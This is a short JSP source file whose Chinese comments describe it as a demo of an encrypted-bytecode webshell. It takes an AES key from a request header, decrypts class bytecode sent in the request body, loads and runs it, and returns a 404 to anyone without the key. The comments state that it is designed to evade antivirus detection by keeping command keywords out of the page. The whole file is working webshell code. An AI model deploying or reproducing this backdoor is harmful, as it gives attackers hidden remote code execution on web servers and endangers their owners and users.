<%@ page import="java.util.Base64,javax.crypto.Cipher,javax.crypto.spec.*" %>
<%
// JSP 加密字节码马 demo：请求 AES 密文 → 解出 .class 字节码 → defineClass 加载执行
// 免杀面：页面无命令关键词；执行体为运行时类（静态只见解密+类加载）
String k = request.getHeader("X-K");
if (k == null || k.length() < 32) { response.setStatus(404); return; }
byte[] body = request.getInputStream().readAllBytes();
byte[] ct = Base64.getDecoder().decode(new String(body, "UTF-8"));
Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k.substring(0,16).getBytes(), "AES"),
       new IvParameterSpec(k.substring(16,32).getBytes()));
byte[] cls = c.doFinal(ct);
ClassLoader cl = new ClassLoader(getClass().getClassLoader()) {
    Class<?> def(byte[] b) { return defineClass(null, b, 0, b.length); }
};
Object r = cl.def(cls).getDeclaredMethod("run").invoke(null);
out.print(r);
%>
